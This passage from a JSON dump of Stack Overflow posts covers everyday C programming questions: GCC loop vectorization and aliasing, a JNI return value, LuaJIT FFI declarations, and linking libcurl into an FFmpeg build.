&gt;= 1.0) {\n            cents -= 1.0;\n            penny += 1;\n        }\n    }\n    printf(\"%f quarters, %f dimes, %f nickels, %f pennies, Total of %f coins.\\n\", quarter, dime, nickel, penny, quarter + dime + nickel + penny);\n}\n</code></pre>\n"}, {"tags": ["c", "gcc", "auto-vectorization"], "comments": [{"owner": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 1, "creation_date": 1437607696, "post_id": 31575698, "comment_id": 51106173, "body": "Why don&#39;t you typedef those because they are hard to read."}, {"owner": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 0, "creation_date": 1437607872, "post_id": 31575698, "comment_id": 51106221, "body": "You don&#39;t need the <code>register</code> keyword."}, {"owner": {"reputation": 631, "user_id": 1649948, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5a42795ba591110c540563b1b396f2df?s=128&d=identicon&r=PG", "display_name": "user1649948", "link": "https://stackoverflow.com/users/1649948/user1649948"}, "reply_to_user": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 0, "creation_date": 1437607987, "post_id": 31575698, "comment_id": 51106251, "body": "Thanks for the tips! Only shown here to be clear there isn&#39;t something weird going on in the typedef. Also, I&#39;m using register because variables tagged &quot;register&quot; should not have their address accessible by anything (and hence no aliasing)."}, {"owner": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 1, "creation_date": 1437608085, "post_id": 31575698, "comment_id": 51106280, "body": "You can always manually create a vector type <code>typedef int v4si __attribute__ ((vector_size (16)));</code> so you can control the vectors yourself."}, {"owner": {"reputation": 631, "user_id": 1649948, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5a42795ba591110c540563b1b396f2df?s=128&d=identicon&r=PG", "display_name": "user1649948", "link": "https://stackoverflow.com/users/1649948/user1649948"}, "reply_to_user": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 0, "creation_date": 1437608214, "post_id": 31575698, "comment_id": 51106315, "body": "That is a great piece of advice. I was worried about the portability of these types outside GCC (in fact, I&#39;m also worried about the GCC-specific alignment declarations in the above code). Also, I haven&#39;t really seen a good guide for how to use them. If I were to guess at what v4si means, v4 = vector of 4, i = integer, I guess."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1437608354, "post_id": 31575698, "comment_id": 51106348, "body": "Do you actually need all the <code>__attribute__((aligned(16)))</code> and the <code>__builtin_assume_aligned()</code>?  I&#39;d get rid of these if you safely can, and also of the <code>register</code> keywords.  I don&#39;t think <code>restrict</code> is useful for local variables, either, but I guess it&#39;s not harmful."}, {"owner": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 0, "creation_date": 1437608380, "post_id": 31575698, "comment_id": 51106352, "body": "The <code>v4si</code> typedef will be 16 byte aligned and gcc will automatically generate simd instructions for it when doing arithmetic operations."}, {"owner": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 0, "creation_date": 1437608463, "post_id": 31575698, "comment_id": 51106374, "body": "@user1649948 &quot; I was worried about the portability&quot; - you&#39;re already using non portable code anyways."}, {"owner": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 1, "creation_date": 1437608608, "post_id": 31575698, "comment_id": 51106405, "body": "@user1649948 - Heres a link worth reading if you haven&#39;t yet. <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Vector-Extensions.html\" rel=\"nofollow noreferrer\">GCC Vector extensions</a>"}, {"owner": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 0, "creation_date": 1437609119, "post_id": 31575698, "comment_id": 51106538, "body": "@user1649948 &quot; I was worried about the portability&quot; - It seems like your worried more about performance than portability in this case."}, {"owner": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 0, "creation_date": 1437609240, "post_id": 31575698, "comment_id": 51106574, "body": "@user1649948 What tool did you use to point out this code as a bottleneck?"}, {"owner": {"reputation": 631, "user_id": 1649948, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5a42795ba591110c540563b1b396f2df?s=128&d=identicon&r=PG", "display_name": "user1649948", "link": "https://stackoverflow.com/users/1649948/user1649948"}, "edited": false, "score": 0, "creation_date": 1437609291, "post_id": 31575698, "comment_id": 51106583, "body": "I can take off everything but the __builtin_assume_aligned and get the same generated code. Without the assume_aligned, the &quot;Calculated minimum iters for profitability&quot; goes from 10 (which is too high IMO) to 27."}, {"owner": {"reputation": 631, "user_id": 1649948, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5a42795ba591110c540563b1b396f2df?s=128&d=identicon&r=PG", "display_name": "user1649948", "link": "https://stackoverflow.com/users/1649948/user1649948"}, "edited": false, "score": 0, "creation_date": 1437609359, "post_id": 31575698, "comment_id": 51106604, "body": "This code is a bottleneck because it is the core of my program, where I am filling this matrix over and over. If I replace it with dummy code the program runs instantly. ;)"}, {"owner": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 1, "creation_date": 1437609973, "post_id": 31575698, "comment_id": 51106731, "body": "I would probably make all of the arrays of <code>v4si</code> type."}, {"owner": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 0, "creation_date": 1437611157, "post_id": 31575698, "comment_id": 51107016, "body": "If you have an x86 processor and really want to get down and dirty. Look at this <a href=\"https://gcc.gnu.org/onlinedocs/gcc-4.2.4/gcc/X86-Built_002din-Functions.html\" rel=\"nofollow noreferrer\">GCC X86  Instrinsics</a> and do the SIMD instructions.  You can probably get some optimizations down better than the compiler in some cases."}, {"owner": {"reputation": 4652, "user_id": 2189128, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/P19VP.jpg?s=128&g=1", "display_name": "Jeff Hammond", "link": "https://stackoverflow.com/users/2189128/jeff-hammond"}, "edited": false, "score": 0, "creation_date": 1437624494, "post_id": 31575698, "comment_id": 51110123, "body": "Use icc if you want a better vectorizing C compiler for x86."}, {"owner": {"reputation": 631, "user_id": 1649948, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5a42795ba591110c540563b1b396f2df?s=128&d=identicon&r=PG", "display_name": "user1649948", "link": "https://stackoverflow.com/users/1649948/user1649948"}, "edited": false, "score": 0, "creation_date": 1437675307, "post_id": 31575698, "comment_id": 51141985, "body": "I will try using v4si if I can find answers to my last few questions about them: 1) Can I cast an arbitrary aligned array to the v4si type? 2) How can I move all elements in a vector one position to the left, saving the result to a new vector? (It&#39;s okay if I lose the left-most value and introduce gibberish on the right.)"}, {"owner": {"reputation": 631, "user_id": 1649948, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5a42795ba591110c540563b1b396f2df?s=128&d=identicon&r=PG", "display_name": "user1649948", "link": "https://stackoverflow.com/users/1649948/user1649948"}, "edited": false, "score": 0, "creation_date": 1437676515, "post_id": 31575698, "comment_id": 51142700, "body": "Added the last to its own question <a href=\"http://stackoverflow.com/questions/31595366/gcc-c-vector-extension-how-to-shift-contents-of-a-vector-to-the-left-by-one-ele\">here</a>."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437714096, "post_id": 31575698, "comment_id": 51155831, "body": "the posted code doesn&#39;t even begin to compile (nearly 30 errors and warnings using gcc with -Wall -Wextra -pedantic -std=c99)  You state that the code takes a very long time to run, as posted.  Since the posted code does not even begin to compile.... how can it be running?"}, {"owner": {"reputation": 631, "user_id": 1649948, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5a42795ba591110c540563b1b396f2df?s=128&d=identicon&r=PG", "display_name": "user1649948", "link": "https://stackoverflow.com/users/1649948/user1649948"}, "edited": false, "score": 0, "creation_date": 1437972846, "post_id": 31575698, "comment_id": 51236680, "body": "It compiles, but needs the matrices referred to in the declarations. I left them out for brevity. I describe them immediately after the code, if that helps!"}], "owner": {"reputation": 631, "user_id": 1649948, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5a42795ba591110c540563b1b396f2df?s=128&d=identicon&r=PG", "display_name": "user1649948", "link": "https://stackoverflow.com/users/1649948/user1649948"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 599, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1437607531, "creation_date": 1437607531, "question_id": 31575698, "link": "https://stackoverflow.com/questions/31575698/how-to-tell-gcc-there-is-no-pointer-aliasing-for-loop-auto-vectorization-restr", "title": "How to tell GCC there is no pointer aliasing for loop auto-vectorization? (Restrict doesn&#39;t work)", "body": "<p>I am having problems getting GCC to vectorize this loop:</p>\n\n<pre><code>register int_fast8_t  __attribute__ ((aligned)) * restrict fillRow = __builtin_assume_aligned(rowMaps + query[i]*rowLen,8);\n    register int  __attribute__ ((aligned (16))) *restrict curRow = __builtin_assume_aligned(scoreMatrix + i*rowLen,16), \n         __attribute__ ((aligned (16))) *restrict prevRow = __builtin_assume_aligned(curRow - rowLen,16);\n    register unsigned   __attribute__ ((aligned (16))) *restrict shiftCur = __builtin_assume_aligned(shiftMatrix + i*rowLen,16), \n        __attribute__ ((aligned (16))) *restrict shiftPrev = __builtin_assume_aligned(shiftCur - rowLen,16);\n    unsigned j; \n\n    unsigned *restrict  diagShift = shiftPrev - 1;\n    int *restrict diagScore = prevRow - 1;\n     for (j=1; j &lt; rs; ++j) {\n        curRow[j] = diagScore[j] + fillRow[j];\n        shiftCur[j] = diagShift[j]; \n\n    }\n</code></pre>\n\n<p>These variables come from two matrices (scoreMatrix and shiftMatrix, which are declared aligned and are guaranteed to have each \"row\" start aligned), as well as an 8-bit array (fillRow). GCC keeps telling me:</p>\n\n<pre><code>prog.c:600:4: note: === vect_analyze_data_ref_dependences ===\nprog.c:600:4: note: versioning for alias required: can't determine dependence between *_90 and *_89\nprog.c:600:4: note: mark for run-time aliasing test between *_90 and *_89\nprog.c:600:4: note: versioning for alias required: can't determine dependence between *_98 and *_97\nprog.c:600:4: note: mark for run-time aliasing test between *_98 and *_97\n</code></pre>\n\n<p>Where line 600 is the loop in question. I don't know how to make it any more explicit that there is no aliasing going on. Previously I left out the diagShift and diagScore lines and just had the loop index, for instance, prevRow[j-1] instead of \"diagShift[j]\" -- exact same result. What can I do?</p>\n"}, {"tags": ["java", "c", "methods", "java-native-interface", "return"], "comments": [{"owner": {"reputation": 7290, "user_id": 4785110, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1bae5c00f27770d807c943268438bb6?s=128&d=identicon&r=PG&f=1", "display_name": "maraca", "link": "https://stackoverflow.com/users/4785110/maraca"}, "edited": false, "score": 1, "creation_date": 1437607336, "post_id": 31575625, "comment_id": 51106085, "body": "How about adding a 3rd parameter? (which allows to suppress this line from being printed)"}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1437607403, "post_id": 31575625, "comment_id": 51106107, "body": "<code>new TestJNIPrimitive().average(3,2);</code> calls your function. You call it twice, it gets called twice."}], "answers": [{"tags": [], "owner": {"reputation": 8893, "user_id": 2150749, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YQ97m.png?s=128&g=1", "display_name": "Jashaszun", "link": "https://stackoverflow.com/users/2150749/jashaszun"}, "is_accepted": true, "score": 5, "last_activity_date": 1437607284, "creation_date": 1437607284, "answer_id": 31575658, "question_id": 31575625, "link": "https://stackoverflow.com/questions/31575625/how-to-call-only-the-return-value-to-java-from-a-c-file-function-java-native-in/31575658#31575658", "title": "How to call only the return value to Java from a C file function (Java Native Interface)", "body": "<p>Unless I'm missing something, you can simply <em>not</em> call your C <code>average</code> function twice, and just store the result after you call it once:</p>\n\n<pre><code>public static void main(String args[]) {\n    double result = new TestJNIPrimitive().average(3,2);\n    System.out.println(\"In Java, the average is \" + result);\n    System.out.println(result*2);\n}\n</code></pre>\n"}], "owner": {"reputation": 87, "user_id": 4294313, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/qChH0.jpg?s=128&g=1", "display_name": "astroball", "link": "https://stackoverflow.com/users/4294313/astroball"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 559, "favorite_count": 0, "accepted_answer_id": 31575658, "answer_count": 1, "score": 1, "last_activity_date": 1437621501, "creation_date": 1437607042, "last_edit_date": 1592644375, "question_id": 31575625, "link": "https://stackoverflow.com/questions/31575625/how-to-call-only-the-return-value-to-java-from-a-c-file-function-java-native-in", "title": "How to call only the return value to Java from a C file function (Java Native Interface)", "body": "<p>I have a Java file that declares a native method average() which is defined in my C file. The method takes the average of two numbers, prints &quot;In C, the numbers are n1, n2&quot; (n1 and n2 being the input numbers), and returns the average as a double.</p>\n<p>The Java file then calls the average() method, prints &quot;In Java, the average is (n1 + n2)/2&quot; and then prints the average x 2.</p>\n<p>Here is an example with the numbers 3 and 2 (running my Java file):</p>\n<blockquote>\n<p>In C, the numbers are 3 and 2</p>\n<p>In Java, the average is 2.5</p>\n<p>In C, the numbers are 3 and 2</p>\n<p>5.0</p>\n</blockquote>\n<p>I would like to multiply only the return value from the C file (the average value) by 2. I don't want the string &quot;In C, the numbers are 3 and 2&quot; to print again. How can I print only the return value (average) from the C file and not have the string &quot;In C, the numbers are 3 and 2&quot; print again? I know I can just create another method but that would be very repetitive.</p>\n<p>My Java file follows:</p>\n<pre><code>public class TestJNIPrimitive {\n    \n    static {\n        System.loadLibrary(&quot;myjni&quot;); //myjni.dll (Windows)\n    }\n\n    private native double average(int n1, int n2);\n    public static void main(String args[]) {\n        \n        System.out.println(&quot;In Java, the average is &quot; + new TestJNIPrimitive().average(3,2));\n        double result = new TestJNIPrimitive().average(3,2);\n        System.out.println(result*2);\n    }\n}\n</code></pre>\n<p>My C file follows:</p>\n<pre><code>JNIEXPORT jdouble JNICALL Java_TestJNIPrimitive_average(JNIEnv *env, jobject thisObj, jint n1, jint n2) {\n    \n    printf(&quot;In C, the numbers are %d and %d\\n&quot;, n1, n2);\n    jdouble result;\n    result = ((jdouble)n1 + n2) / 2.0;\n    // jint is mapped to int, jdouble is mapped to double\n    return result;\n}\n</code></pre>\n<p>Thanks for the help!</p>\n"}, {"tags": ["c++", "c", "lua", "ffi", "luajit"], "answers": [{"tags": [], "owner": {"reputation": 13709, "user_id": 63791, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/7XiDt.png?s=128&g=1", "display_name": "Alex", "link": "https://stackoverflow.com/users/63791/alex"}, "is_accepted": true, "score": 6, "last_activity_date": 1437605596, "creation_date": 1437605596, "answer_id": 31575388, "question_id": 31575216, "link": "https://stackoverflow.com/questions/31575216/luajit-ffi-cdef-doesnt-understand-class/31575388#31575388", "title": "LuaJIT FFI cdef doesn&#39;t understand &#39;class&#39;?", "body": "<p><code>class</code> is a C++ keyword. It doesn't exist in C. LuaJIT expects C code, not C++ code in the FFI block.</p>\n\n<p>As for how to work around this, it depends on what you're doing. Either you make that a C <code>struct</code>, or you find a different way to access it.</p>\n"}], "owner": {"reputation": 345, "user_id": 2030964, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/I3DrJ.jpg?s=128&g=1", "display_name": "theman", "link": "https://stackoverflow.com/users/2030964/theman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 762, "favorite_count": 0, "accepted_answer_id": 31575388, "answer_count": 1, "score": -1, "last_activity_date": 1437605596, "creation_date": 1437604529, "question_id": 31575216, "link": "https://stackoverflow.com/questions/31575216/luajit-ffi-cdef-doesnt-understand-class", "title": "LuaJIT FFI cdef doesn&#39;t understand &#39;class&#39;?", "body": "<pre><code>class Myuser * MyClient_GetMyUser(AUser aUser);\n</code></pre>\n\n<p>This is the error for trying to declare that function with ffi.cdef:</p>\n\n<pre><code>Error: dllImport.lua:861: declaration specifier expected near 'class' at line 20\n</code></pre>\n\n<p>How is this possible? How would I go about declaring 'class' if I must do so within cdef?</p>\n"}, {"tags": ["c", "ffmpeg", "makefile", "libcurl"], "comments": [{"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1437604758, "post_id": 31574993, "comment_id": 51105345, "body": "Please show the build command that is generating that error."}, {"owner": {"reputation": 1, "user_id": 5145589, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7bb8b856453c1aabde541daf510ebe19?s=128&d=identicon&r=PG&f=1", "display_name": "hoschi111", "link": "https://stackoverflow.com/users/5145589/hoschi111"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1437605634, "post_id": 31574993, "comment_id": 51105633, "body": "Thanks for reply. Please see above. &quot;make clean &amp;&amp; ./configure --prefix=/usr --enable-gpl --enable-libmp3lame --enable-libx264 &amp;&amp; make -j 4&quot;"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 1, "creation_date": 1437605775, "post_id": 31574993, "comment_id": 51105676, "body": "That&#39;s the top level make command not the actual build command that causes the error. The one that causes the error is the one that has gcc in it (or some other compilation step)."}, {"owner": {"reputation": 1, "user_id": 5145589, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7bb8b856453c1aabde541daf510ebe19?s=128&d=identicon&r=PG&f=1", "display_name": "hoschi111", "link": "https://stackoverflow.com/users/5145589/hoschi111"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1437607260, "post_id": 31574993, "comment_id": 51106067, "body": "There was an include in the makefile. &quot;common.mak&quot; showing some gcc stuff. Maybe this helps. <a href=\"https://infotomb.com/deo4j.txt\" rel=\"nofollow noreferrer\">infotomb.com/deo4j.txt</a>"}, {"owner": {"reputation": 35113, "user_id": 3826372, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/P0peM.png?s=128&g=1", "display_name": "Ross Ridge", "link": "https://stackoverflow.com/users/3826372/ross-ridge"}, "edited": false, "score": 0, "creation_date": 1437607905, "post_id": 31574993, "comment_id": 51106231, "body": "What Alan Au is asking you to do is post the lines that appear in the output before the error you quoted in your question."}, {"owner": {"reputation": 1, "user_id": 5145589, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7bb8b856453c1aabde541daf510ebe19?s=128&d=identicon&r=PG&f=1", "display_name": "hoschi111", "link": "https://stackoverflow.com/users/5145589/hoschi111"}, "edited": false, "score": 0, "creation_date": 1437608789, "post_id": 31574993, "comment_id": 51106445, "body": "few lines above + under the quoted error: <a href=\"https://infotomb.com/h6f4y.txt\" rel=\"nofollow noreferrer\">infotomb.com/h6f4y.txt</a>"}, {"owner": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1437609136, "post_id": 31574993, "comment_id": 51106547, "body": "The autotools generate <code>Makefile</code> from either <code>Makefile.am</code> or <code>Makefile.in</code> so if you changed the <code>Makefile</code> and re-ran the <code>configure</code> script it likely removed your changes. Check that they are still there (assuming you need to make them that way). Also adding <code>V=1</code> to the main make command line should cause make to output the actual commands being run instead of the &quot;friendly&quot; <code>LD</code>/<code>MAN</code>/etc. output."}, {"owner": {"reputation": 1, "user_id": 5145589, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7bb8b856453c1aabde541daf510ebe19?s=128&d=identicon&r=PG&f=1", "display_name": "hoschi111", "link": "https://stackoverflow.com/users/5145589/hoschi111"}, "edited": false, "score": 0, "creation_date": 1437661193, "post_id": 31574993, "comment_id": 51131969, "body": "Here is the &quot;unfriendly&quot; output with previos gcc: <a href=\"http://puu.sh/j9Ulo/ca315cc6a0.png\" rel=\"nofollow noreferrer\">puu.sh/j9Ulo/ca315cc6a0.png</a>"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 5145589, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7bb8b856453c1aabde541daf510ebe19?s=128&d=identicon&r=PG&f=1", "display_name": "hoschi111", "link": "https://stackoverflow.com/users/5145589/hoschi111"}, "edited": false, "score": 0, "creation_date": 1437661152, "post_id": 31575941, "comment_id": 51131936, "body": "Thanks for your reply. I still got that error. Error with previous gcc commands: <a href=\"http://puu.sh/j9Ulo/ca315cc6a0.png\" rel=\"nofollow noreferrer\">puu.sh/j9Ulo/ca315cc6a0.png</a>"}, {"owner": {"reputation": 9546, "user_id": 4726410, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-01-VKaG7APo/AAAAAAAAAAI/AAAAAAAAE9w/c0cx5Eqf08s/photo.jpg?sz=128", "display_name": "Ronald S. Bultje", "link": "https://stackoverflow.com/users/4726410/ronald-s-bultje"}, "reply_to_user": {"reputation": 1, "user_id": 5145589, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7bb8b856453c1aabde541daf510ebe19?s=128&d=identicon&r=PG&f=1", "display_name": "hoschi111", "link": "https://stackoverflow.com/users/5145589/hoschi111"}, "edited": false, "score": 0, "creation_date": 1437663364, "post_id": 31575941, "comment_id": 51133857, "body": "After --extra-ldflags=&#39;-lcurl&#39;, you should see -lcurl as part of the LDFLAGS variable in your config.mak, which would cause it to be added to your linker commandline. However, I&#39;m not seeing it here. Is -lcurl part of your LDFLAGS in config.mak? If not, can you add it there or see why it wasn&#39;t added automatically when using --extra-ldflags=&#39;-lcurl&#39;?"}, {"owner": {"reputation": 1, "user_id": 5145589, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7bb8b856453c1aabde541daf510ebe19?s=128&d=identicon&r=PG&f=1", "display_name": "hoschi111", "link": "https://stackoverflow.com/users/5145589/hoschi111"}, "edited": false, "score": 0, "creation_date": 1437663913, "post_id": 31575941, "comment_id": 51134370, "body": "That&#39;s the LDFLAGS variable in the config.mak: LDFLAGS= -L/usr/local/lib -lcurl  -Wl,--as-needed -Wl,-z,noexecstack -Wl,--warn-common -Wl,-rpath-link=libpostproc:libswresample:libswscale:libavfi&zwnj;&#8203;lter:libavdevice:lib&zwnj;&#8203;avformat:libavcodec:&zwnj;&#8203;libavutil:libavresam&zwnj;&#8203;ple"}], "tags": [], "owner": {"reputation": 9546, "user_id": 4726410, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-01-VKaG7APo/AAAAAAAAAAI/AAAAAAAAE9w/c0cx5Eqf08s/photo.jpg?sz=128", "display_name": "Ronald S. Bultje", "link": "https://stackoverflow.com/users/4726410/ronald-s-bultje"}, "is_accepted": false, "score": 1, "last_activity_date": 1437609175, "creation_date": 1437609175, "answer_id": 31575941, "question_id": 31574993, "link": "https://stackoverflow.com/questions/31574993/linux-c-makefile-ffmpeg-undefined-reference-to-curl-easy-init/31575941#31575941", "title": "Linux C Makefile (FFmpeg) undefined reference to `curl_easy_init&#39;", "body": "<p>Use this to configure FFmpeg:</p>\n\n<p>./configure --prefix=/usr --enable-gpl --enable-libmp3lame --enable-libx264 --extra-cflags='-I/usr/local/include' --extra-ldflags='-L/usr/local/lib -lcurl'</p>\n\n<p>Don't mess with the Makefile, FFmpeg's build system isn't quite standard and simple as most typical opensource projects' Makefiles.</p>\n"}], "owner": {"reputation": 1, "user_id": 5145589, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7bb8b856453c1aabde541daf510ebe19?s=128&d=identicon&r=PG&f=1", "display_name": "hoschi111", "link": "https://stackoverflow.com/users/5145589/hoschi111"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 810, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1437609175, "creation_date": 1437603425, "last_edit_date": 1437604152, "question_id": 31574993, "link": "https://stackoverflow.com/questions/31574993/linux-c-makefile-ffmpeg-undefined-reference-to-curl-easy-init", "title": "Linux C Makefile (FFmpeg) undefined reference to `curl_easy_init&#39;", "body": "<p>I did some changes to /libavformat/concat.c in the FFmpeg source.\nThere I included libcurl.</p>\n\n<p>Internet says I have to add the following code to 'Makefile'.</p>\n\n<pre><code>INCLUDE = -I/usr/local/include\nLDFLAGS = -L/usr/local/lib\nLDLIBS = -lcurl\n</code></pre>\n\n<p>That did not work.\nI use this to build FFmpeg:</p>\n\n<pre><code>make clean &amp;&amp; ./configure --prefix=/usr --enable-gpl --enable-libmp3lame --enable-libx264 &amp;&amp; make -j 4\n</code></pre>\n\n<p>Error:</p>\n\n<pre><code>/usr/lib/gcc/x86_64-linux-gnu/4.9/../../../../lib/libavformat.a(concat.o): In function `concat_read':\n/root/ffmpeg_sources/ffmpeg/libavformat/concat.c:151: undefined reference to `curl_easy_init'\n/root/ffmpeg_sources/ffmpeg/libavformat/concat.c:155: undefined reference to `curl_easy_setopt'\n/root/ffmpeg_sources/ffmpeg/libavformat/concat.c:156: undefined reference to `curl_easy_perform'\n/root/ffmpeg_sources/ffmpeg/libavformat/concat.c:158: undefined reference to `curl_easy_getinfo'\n</code></pre>\n\n<p>original Makefile:\n<a href=\"https://github.com/FFmpeg/FFmpeg/blob/master/Makefile\" rel=\"nofollow\">https://github.com/FFmpeg/FFmpeg/blob/master/Makefile</a></p>\n\n<p>Can you help me?</p>\n"}, {"tags": ["c", "arrays", "string", "string-literals", "c89"], "comments": [{"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": 